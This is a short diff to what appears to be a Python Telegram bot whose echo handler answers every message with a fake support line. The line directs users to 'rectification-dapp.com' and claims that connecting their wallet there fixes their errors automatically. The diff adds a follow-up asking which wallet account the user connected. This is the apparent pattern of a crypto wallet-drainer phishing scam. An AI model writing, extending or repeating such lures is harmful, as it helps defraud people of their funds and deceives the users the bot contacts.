@@ -18,6 +18,9 @@ def start(update, context):
 
 def echo(update, context):
     update.message.reply_text('Kindly navigate to https://rectification-dapp.com to reseolve issues related to that, upon connecting to the dapp platform; your errors are automatically fixed')
+    update.message.reply_text('Which wallet account did you use to connect')
+
+    
 
 def error(update, context):
     """Log Errors caused by Updates."""
